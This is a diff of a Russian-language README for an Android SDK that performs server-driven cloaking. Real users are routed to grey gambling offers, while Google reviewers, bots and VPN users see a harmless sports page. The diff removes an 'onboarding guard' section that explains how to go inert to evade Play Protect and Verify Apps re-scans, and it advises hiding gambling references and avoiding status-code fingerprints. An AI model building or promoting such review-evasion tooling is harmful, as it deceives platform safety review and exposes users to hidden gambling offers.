@@ -1,10 +1,10 @@
-# SDK v4.0.4 — тонкий клиент для server-driven routing
+# SDK v4.0.5 — тонкий клиент для server-driven routing
 
 Лёгкий Android клиент. Один класс, один POST, минимум палева в APK.
 
-POST протокол · headers-based auth · Play Integrity Standard API · **per-app path aligned с Digital Asset Links (DAL)** · onboarding guard off by default (max conversion mode).
+POST протокол · headers-based auth · Play Integrity Standard API · **per-app path aligned с Digital Asset Links (DAL)** · без клиентского TTL — max conversion.
 
-Repo: `github.com/redzov/android-sdk-v3` · Tag: `v4.0.4`
+Repo: `github.com/redzov/android-sdk-v3` · Tag: `v4.0.5`
 
 ---
 
@@ -19,7 +19,7 @@ Repo: `github.com/redzov/android-sdk-v3` · Tag: `v4.0.4`
 3. **Mini-КЛО FastAPI** локально скорит трафик (Play Integrity, IPQS, IPinfo — server-to-server легит запросы)
 4. Real user → grey URL (`https://свой-домен.com/go?t=<b64>` → Turnstile → offer)
 5. Bot / Google reviewer / VPN / wrong geo → safe_url (спортивный контент)
-6. **Onboarding guard**: после первого успешного resolve SDK ставит local flag и больше НЕ звонит на бекенд
+6. SDK стучится на бэкенд **при каждом запуске** — юзер, вернувшийся после ставки, снова получает актуальный оффер
 
 **В APK только домен своего мини-сервера.** Никаких упоминаний threeamigos или гемблинга.
 
@@ -90,7 +90,6 @@ lifecycleScope.launch {
 | `authToken` | `""` | Sid — в header `X-Sid` |
 | `cloudProjectNumber` | `0L` | Play Console → App integrity. `0L` = skip PI |
 | `enableIntegrity` | `true` | Play Integrity Standard API |
-| `enableOnboardingGuard` | `false` | Если `true` — после первого успешного resolve SDK молчит 24h. С v4.0.4 default `false` (максимальный конверт) |
 
 ---
 
@@ -144,21 +143,6 @@ Content-Type: application/json
 ```
 
 Никогда 301/302/404/500 в ответ на valid request. Разное поведение по статусу = fingerprint.
-
----
-
-## 🔒 Onboarding guard
-
-После первого успешного `resolve()` SDK записывает `onboarded=true` в SharedPreferences и **никогда** больше не звонит на бекенд.
-
-**Impact:**
-- Real user получает grey URL 1 раз → Play Protect telemetry видит один outgoing request → не строит суспектный pattern
-- Google reviewer открывает APK → guard не активен (первый запуск) → scoring возвращает white (integrity_missing) → fallback native
-- Verify Apps re-scan через дни → SDK видит `onboarded=true` → **inert app**, никаких network calls
-
-Combines с server-side onboarded SETNX (30-day TTL) на скоринге.
-
-Debug reset: `client.resetOnboardingForTesting()` (в prod НЕ вызывать).
 
 ---
 
